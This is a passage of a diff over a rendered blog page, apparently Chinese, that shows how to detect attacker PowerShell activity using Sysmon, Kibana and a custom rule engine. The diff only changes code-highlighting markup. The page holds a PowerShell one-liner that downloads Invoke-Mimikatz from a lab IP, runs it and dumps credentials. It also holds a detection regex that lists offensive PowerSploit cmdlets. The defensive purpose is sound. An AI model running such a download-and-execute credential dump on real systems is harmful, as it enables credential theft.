-powershell IEX <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-Mimikatz.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-Mimikatz   -DumpCreds 
-</pre></div>
+powershell<span class="w"> </span>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-Mimikatz.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-Mimikatz<span class="w">   </span>-DumpCreds<span class="w"> </span>
+</code></pre></div>
 <p>可以在kibana 看到如下内容</p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG86.jpeg"/></p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG87.jpeg"/></p>
 <p>我们在用Go自研的规则引擎里面添加如下规则（也可以用flink做）</p>
-<div class="highlight"><pre><span></span>state:     <span class="nb">enable</span>
-rule_id :  hacker-command-line-01
-rule_tag:  hacker-command-line
-rule_name: hacker-command-line-01
-rule_type: or  
+<div class="highlight"><pre><span></span><code>state:<span class="w">     </span><span class="nb">enable</span>
+rule_id<span class="w"> </span>:<span class="w">  </span>hacker-command-line-01
+rule_tag:<span class="w">  </span>hacker-command-line
+rule_name:<span class="w"> </span>hacker-command-line-01
+rule_type:<span class="w"> </span>or<span class="w">  </span>
 
 detect_list:
 
-  - field : command_line
-    type: re
-    rule: <span class="o">(</span>Get-GPPAutologon<span class="p">|</span>Get-TimedScreenshot<span class="p">|</span>Invoke-DllInjection<span class="p">|</span>Invoke-Shellcode<span class="p">|</span>Invoke-WmiCommand<span class="p">|</span>Get-System<span class="p">|</span>Invoke-Mimikatz<span class="p">|</span>Invoke-NinjaCopy<span class="p">|</span>Out-Minidump<span class="o">)</span>
-    ignorecase: <span class="nb">true</span>
+<span class="w">  </span>-<span class="w"> </span>field<span class="w"> </span>:<span class="w"> </span>command_line
+<span class="w">    </span>type:<span class="w"> </span>re
+<span class="w">    </span>rule:<span class="w"> </span><span class="o">(</span>Get-GPPAutologon<span class="p">|</span>Get-TimedScreenshot<span class="p">|</span>Invoke-DllInjection<span class="p">|</span>Invoke-Shellcode<span class="p">|</span>Invoke-WmiCommand<span class="p">|</span>Get-System<span class="p">|</span>Invoke-Mimikatz<span class="p">|</span>Invoke-NinjaCopy<span class="p">|</span>Out-Minidump<span class="o">)</span>
+<span class="w">    </span>ignorecase:<span class="w"> </span><span class="nb">true</span>
 
-threat_level : high
-auth : njcx
-info: hacker <span class="nb">command</span> tools
+threat_level<span class="w"> </span>:<span class="w"> </span>high
+auth<span class="w"> </span>:<span class="w"> </span>njcx
+info:<span class="w"> </span>hacker<span class="w"> </span><span class="nb">command</span><span class="w"> </span>tools
 
 e-mail:
-    - njcx@qq.com
-    - njcx91@qq.com
-</pre></div>
+<span class="w">    </span>-<span class="w"> </span>njcx@qq.com
+<span class="w">    </span>-<span class="w"> </span>njcx91@qq.com
+</code></pre></div>
 <p>规则引擎命中后，即会写es，同时给邮箱发送告警，方便许多。</p>
   </div>
 </article>
